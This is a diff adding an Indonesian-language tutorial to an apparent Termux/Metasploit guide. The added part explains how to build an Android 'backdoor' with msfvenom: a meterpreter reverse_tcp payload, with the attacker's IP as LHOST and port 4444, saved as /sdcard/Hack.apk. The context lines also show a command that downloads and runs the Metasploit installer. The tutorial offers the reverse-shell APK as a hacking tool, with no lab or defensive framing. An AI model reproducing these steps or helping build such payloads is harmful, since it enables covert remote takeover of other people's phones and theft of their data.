@@ -4,6 +4,30 @@ $ pkg install unstable-repo
 $ pkg install metasploit
 
 
+Setelah bahan-bahan di atas sudah siap sekarang kita lanjut ke tahap pembuatan BACDOOR nya,
+>>> pertama buka aplikasi termux nya
+>>> kalo sudah, kalian ketikan seperti di bawah :
+
+$msfvenom -p android/meterpreter/reverse_tcp LHOST=....... LPORT=...... -o /sdcard/......
+
+>> LHOST=.......= isi dengan IP kalian
+Contoh: LHOST=127.0.0.1
+
+>> untuk cara mengetahui IP kalian, buka seeason baru di termux lalu ketikan :
+
+$ifconfig
+
+>> Kalo LPORT bebas yah
+Contoh : LPORT=4444
+
+>> untuk /sdcard/..... =  isi dengan nama backdoor nya bebas
+Contoh: /sdcard/Hack.apk
+
+>> Setelah Di set seperti ini :
+
+$msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /sdcard/Hack.apk
+
+
 Install Metasploit Di Kali Linux
 
 curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
